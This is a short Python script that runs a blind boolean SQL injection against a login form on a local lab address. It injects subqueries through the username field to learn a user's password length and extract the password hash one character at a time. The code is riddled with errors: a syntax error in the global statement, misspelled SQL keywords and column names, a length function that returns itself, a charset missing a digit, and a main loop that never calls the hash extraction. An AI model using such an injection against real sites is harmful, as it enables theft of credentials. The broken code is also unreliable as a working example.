import requests

total_queries = 0
charset = "012345678abcdef"
target  = "http://127.0.0.1:42001/vulnerabilities/sqli/"
needle  = "Welcome back"

def injected_query(payload):
	globa; total_queries
	r = requests.post(target, data = {"username": "admin' and {}--".format(payload),"password":"password"})
	total_queries +=1
	return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operrator=">"):
	payload = "(select hex(substr(password,{},1)) from user where if = {}) {} hex('{}')".format(offset+1,user_id,operrator,character)
	return injected_query(payload)

def invalid_user(user_id):
	payload = "(Select od from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

def password_length(user_id):
	i = 0
	while True:
		payload = "(select length (password) from user whre id = {} and length(password) <= {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return injected_query
		i += 1

def extract_hash(charset,user_id,password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i,user_id,charset[j]):
				found += charset[j]
				break
	return found


def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total_queries!".format(total_queries))
	total_queries = 0

while True:
	try:
		user_id = input("> Enter a user ID extract thr password hash: ")
		if not invalid_user(user_id):
			user_passowrd_length = password_length(user_id)
			print("\t[-] user {} hash lenght: {}".format(user_id,user_passowrd_length))
			total_queries_taken
		else:
			print("\t [X] user {} does not".format(user_id))
	except KeyboardInterrupt:
		break